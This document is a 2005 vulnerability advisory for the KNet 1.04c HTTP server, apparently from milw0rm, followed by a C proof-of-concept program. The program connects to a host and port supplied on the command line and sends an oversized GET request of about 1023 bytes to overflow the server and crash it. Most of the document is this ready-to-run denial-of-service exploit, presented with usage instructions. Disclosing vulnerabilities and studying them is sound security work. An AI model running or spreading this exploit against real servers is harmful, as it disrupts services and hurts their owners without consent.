/*
-=[--------------------ADVISORY-------------------]=-
-=[
    ]=-
-=[     Knet <= 1.04c                                                  ]=-
-=[
    ]=-
-=[  Author: CorryL  [corryl80@gmail.com]                ]=-
-=[                                  x0n3-h4ck.org                     ]=-
-=[----------------------------------------------------]=-

-=[+] Application:    Knet
-=[+] Version:        1.04c
-=[+] Vendor's URL:   www.stormystudios.com
-=[+] Platform:       Windows
-=[+] Bug type:       Buffer overflow
-=[+] Exploitation:   Remote
-=[-]
-=[+] Author:         CorryL  ~ CorryL[at]gmail[dot]com ~
-=[+] Reference:      www.x0n3-h4ck.org

..::[ Descriprion ]::..

Knet is an small http server,easy installation and use.

..::[ Bug ]::..

This software is affected a Buffer Overflow.
A malitious attacker sending the request GET AAAAAA..... to 522,
this cause the overwrite of the eip registry,causing the execution of
malicious code.

..::[ Proof Of Concept ]::..

GET AAAAAAAAAAAAAAAAAAAAAAAAAA......... to 522 byte long

..::[ Exploit ]::..
*/
/*
     KNet <= 1.04c is affected to a remote buffer overflow in GET command.
  This PoC demostrate the vulnerability.

     KNet <= 1.04c     PoC Denial Of Service       Coded by: Expanders

     Usage:  ./x0n3-h4ck_Knet-DoS.c <Host> <Port>

*/

#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

void help(char *program_name);

int main(int argc, char *argv[]) {

   struct sockaddr_in trg;
   struct hostent *he;
long addr;
   int sockfd, buff,rc;
char evilbuf[1024];
char buffer[1024];
char *request;
if(argc < 3 ) {
 help(argv[0]);
 exit(0);
}
printf("\n\n-=[ KNet <= 1.04c PoC DoS ::: Coded by Expanders ]=-\n");
   he = gethostbyname(argv[1]);
   sockfd = socket(AF_INET, SOCK_STREAM, 0);
request = (char *) malloc(12344);
   trg.sin_family = AF_INET;
   trg.sin_port = htons(atoi(argv[2]));
   trg.sin_addr = *((struct in_addr *) he->h_addr);
   memset(&(trg.sin_zero), '\0', 8);
printf("\n\nConnecting to target \t...");
rc=connect(sockfd, (struct sockaddr *)&trg, sizeof(struct sockaddr_in));
if(rc==0)
{
 printf("[Done]\nBuilding evil buffer\t...");
 memset(evilbuf,90,1023);
 printf("[Done]\nSending evil request   \t...");
 sprintf(request,"GET %s \n\r\n\r",evilbuf);
 send(sockfd,request,strlen(request),0);
 printf("[Done]\n\n[Finished] Check the server now\n");
}
else
 printf("[Fail] -> Unable to connect\n\n");
close(sockfd);
return 0;

}

void help(char *program_name) {

printf("\n\t-=[      KNet <= 1.04b PoC Denial Of Service      ]=-\n");
printf("\t-=[                                                    ]=-\n");
printf("\t-=[      Coded by ders -/www.x0n3-h4ck.org\\-      ]=-\n\n");
printf("Usage: %s <Host> <Port>\n",program_name);
}

// milw0rm.com [2005-02-25]